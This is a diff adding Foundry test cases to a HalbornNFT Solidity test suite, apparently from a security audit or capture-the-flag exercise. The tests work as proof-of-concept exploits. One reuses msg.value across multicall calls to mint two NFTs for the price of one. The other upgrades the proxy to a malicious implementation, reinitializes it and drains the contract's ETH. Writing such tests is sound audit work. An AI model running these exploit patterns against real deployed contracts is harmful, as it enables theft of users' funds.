@@ -45,6 +45,22 @@ contract HalbornNFT_Test is Test, Merkle {
         assertEq(nft.price(), 1 ether);
     }
 
+    // Critical: multicall reuses msg.value across calls
+    function test_multicall_valueReuse_mintBuyWithETH() public {
+        bytes[] memory calls = new bytes[](2);
+        calls[0] = abi.encodeWithSelector(nft.mintBuyWithETH.selector);
+        calls[1] = abi.encodeWithSelector(nft.mintBuyWithETH.selector);
+
+        vm.deal(address(this), 1 ether);
+        uint256 balanceBefore = address(nft).balance;
+
+        nft.multicall{value: 1 ether}(calls);
+
+        assertEq(nft.balanceOf(address(this)), 2);
+        assertEq(nft.idCounter(), 2);
+        assertEq(address(nft).balance, balanceBefore + 1 ether);
+    }
+
     // Test that anyone can set merkle root
     /**
      * @dev Merkle root manipulation attack
@@ -255,6 +271,66 @@ contract HalbornNFT_Test is Test, Merkle {
         // Step 4: Verify successful theft
         assertEq(contractBalanceAfter, 0);
         assertEq(attackerBalanceAfter - attackerBalanceBefore, 1 ether);
+    }
+
+    // High: Reinitialization After Upgrade Enables State Reset
+    /**
+     * @dev Reinitialization attack after upgrade
+     *
+     * After upgrading to a malicious implementation, the attacker can call
+     * initialize() again on the new implementation, resetting all state
+     * including ownership, merkle root, and price.
+     *
+     * Attack flow:
+     * 1. Upgrade to malicious implementation
+     * 2. Call initialize() on new implementation (reinitialization)
+     * 3. Attacker becomes owner, all state is reset
+     */
+    function test_reinitializationAfterUpgradeEnablesStateReset() public {
+        address unauthorizedUser = address(0xdead);
+        
+        bytes32 originalRoot = nft.merkleRoot();
+        uint256 originalPrice = nft.price();
+        address originalOwner = nft.owner();
+        
+        // Fund contract with ETH
+        vm.deal(address(nft), 1 ether);
+        uint256 contractBalanceBefore = address(nft).balance;
+        
+        vm.startPrank(unauthorizedUser);
+
+        // Step 1: Upgrade to malicious implementation WITHOUT initializing
+        NFT_UUPSattack attack = new NFT_UUPSattack();
+        nft.upgradeTo(address(attack));
+
+        // Step 2: Now initialize on new implementation with attacker-controlled values
+        // This should work because it's a new implementation (initializer modifier allows it)
+        bytes32 maliciousRoot = keccak256("malicious");
+        uint256 maliciousPrice = 666;
+        nft.initialize(maliciousRoot, maliciousPrice);
+
+        // Step 3: Verify state was reset
+        // NFT_UUPSattack sets hackerAddress = msg.sender in initialize()
+        assertEq(nft.merkleRoot(), maliciousRoot);
+        assertEq(nft.price(), maliciousPrice);
+        
+        // Verify attacker can call hacker-only functions (like withdrawETH)
+        uint256 attackerBalanceBefore = unauthorizedUser.balance;
+        nft.withdrawETH(0); // Should drain all ETH to hacker
+        uint256 attackerBalanceAfter = unauthorizedUser.balance;
+        
+        // Verify ETH was drained
+        assertEq(address(nft).balance, 0);
+        assertEq(attackerBalanceAfter - attackerBalanceBefore, contractBalanceBefore);
+
+        // Original values are gone
+        assertNotEq(nft.merkleRoot(), originalRoot);
+        assertNotEq(nft.price(), originalPrice);
+        
+        // Original owner lost control
+        vm.startPrank(originalOwner);
+        vm.expectRevert(); // Original owner can no longer control contract
+        nft.setPrice(1 ether);
     }
 
     function onERC721Received(
